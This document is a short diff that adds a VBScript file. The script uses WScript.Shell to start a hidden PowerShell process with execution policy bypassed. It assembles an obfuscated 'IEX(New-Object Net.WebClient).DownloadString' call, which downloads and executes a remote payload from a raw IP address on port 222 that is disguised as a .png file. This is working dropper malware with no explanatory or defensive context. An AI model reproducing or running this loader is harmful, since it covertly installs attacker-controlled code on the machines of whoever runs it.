@@ -1,0 +1,2 @@
+set A = CreateObject("WScript.Shell")
+A.run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI $YYSUXW='IeX(NeW-OBJeCT NeT.W';$SYWD='eBCLIeNT).DOWNLO';Sleep 1;[BYTe[]];Sleep 1;$YWWWWW3='SHXYZ3(''http://45.141.215.212:222/b.png'')'.RePLACe('SHXYZ3','ADSTRING');Sleep 1;IeX($YYSUXW+$SYWD+$YWWWWW3)",0
